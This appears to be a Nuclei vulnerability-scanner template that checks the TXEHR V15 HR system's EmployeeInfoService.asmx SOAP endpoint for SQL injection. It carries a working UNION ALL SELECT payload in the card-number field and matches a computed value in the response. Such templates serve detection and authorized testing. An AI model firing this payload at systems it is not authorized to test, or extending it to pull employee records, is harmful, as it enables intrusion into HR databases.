folder-8/poc-yaml-tosharesoft-employeeInfoservice-sqli.yaml

id: poc-yaml-tosharesoft-employeeInfoservice-sqli
info:
  name: 同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in the EmployeeInfoService.asmx endpoint of the 同享人力资源管理系统 TXEHR V15.

variables:
  t1: '{{rand_int(100,500)}}'
  t2: '{{to_number(t1)*to_number(t1)*to_number(t1)}}'

http:
  - raw:
      - |
        POST /Service/EmployeeInfoService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetEmployeeByCardNo"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <GetEmployeeByCardNo xmlns="http://tempuri.org/">
        <strCardNo>1' UNION ALL SELECT NULL,(select POWER({{t1}},3)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
        </GetEmployeeByCardNo>
        </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
